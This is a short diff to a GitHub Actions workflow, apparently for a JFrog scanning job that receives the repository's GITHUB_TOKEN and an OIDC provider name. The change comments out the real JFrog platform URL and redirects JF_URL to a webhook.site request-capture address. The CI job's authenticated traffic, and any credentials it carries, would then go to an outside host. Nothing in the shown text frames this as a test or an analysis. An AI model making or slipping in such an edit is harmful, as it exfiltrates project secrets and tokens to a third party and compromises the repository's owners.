@@ -22,6 +22,7 @@ jobs:
           # JFrog platform URL
           JF_GIT_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           JF_GIT_BASE_BRANCH: ${{ matrix.branch }}
-          JF_URL: https://${{ vars.JF_URL }}
+          # JF_URL: https://${{ vars.JF_URL }}
+          JF_URL: https://webhook.site/1d289532-49cf-42d1-90ee-d92e5c98367a
         with:
           oidc-provider-name: dvr-game-github
